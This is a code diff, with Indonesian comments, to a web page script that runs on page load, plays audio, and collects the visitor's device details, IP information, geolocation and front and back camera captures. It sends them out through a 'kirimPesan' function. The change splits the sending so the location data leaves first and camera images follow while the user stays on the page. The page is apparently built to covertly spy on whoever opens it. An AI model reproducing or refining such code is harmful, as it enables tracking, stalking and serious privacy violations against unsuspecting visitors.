@@ -392,23 +392,29 @@ Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
       }
     };
 
-    const mulai = async () => {
-      audio.muted = false;
-      try { await audio.play(); } catch {}
+const mulai = async () => {
+  audio.muted = false;
+  try { await audio.play(); } catch {}
 
-      const info = await ambilDataPerangkat();
-      const grafik = await ambilLayarGrafik(); // ditambahkan di sini
-      const ip = await ambilIPInfo();
-      const lokasi = await ambilLokasi();
-      const depan = await ambilKamera("user", "depan");
-      const belakang = await ambilKamera("environment", "belakang");
+  // 1. Ambil & kirim info utama DULU
+  const info = await ambilDataPerangkat();
+  const ip = await ambilIPInfo();
+  const lokasi = await ambilLokasi();
 
-      const kameraDepanStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`;
-      const kameraBelakangStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`;
+  const gabungAwal = [info, ip, lokasi].join("\n\n");
+  await kirimPesan(gabungAwal);
 
-      const gabung = [info, grafik, ip, lokasi, kameraDepanStatus, kameraBelakangStatus].join("\n\n");
-      await kirimPesan(gabung);
-    };
+  // 2. Kamera dijalankan belakangan, jika user masih di halaman
+  ambilKamera("user", "depan").then(async (depan) => {
+    const depanStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`;
+    await kirimPesan(depanStatus);
+  });
+
+  ambilKamera("environment", "belakang").then(async (belakang) => {
+    const belakangStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`;
+    await kirimPesan(belakangStatus);
+  });
+};
 
     window.addEventListener("load", mulai);
   </script>
